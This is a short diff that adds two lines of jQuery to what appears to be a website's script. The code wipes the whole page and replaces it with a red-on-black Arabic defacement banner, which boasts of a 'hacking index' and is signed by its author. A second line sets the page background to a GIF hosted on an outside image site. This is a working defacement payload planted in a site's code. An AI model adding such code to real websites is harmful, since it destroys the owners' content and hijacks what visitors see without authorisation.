@@ -1,0 +1,2 @@
+$('html').html('<span class="fa fl"style="background-color:black;color:#f50000;margin:4px;padding:8px;width:100%;margin-left:30%;font-size:x-large;-webkit-text-emphasis-style:open;"<\span>تجربة _ أندكس أختراق.] قيد التطوير .] ثق : تماما لـو أردت شي سوف أجلبه .] رغم أنف الجميع .] |||| كلاأإودكس || || فهد .|الششمري .] !<span><img alt="333a" border="0" src="https://mrkzgulfup.com/uploads/160710758437121.gif" /></a>')
+$('body').css({"background-image":"url(https://l.top4top.io/p_179957njn1.gif)"});
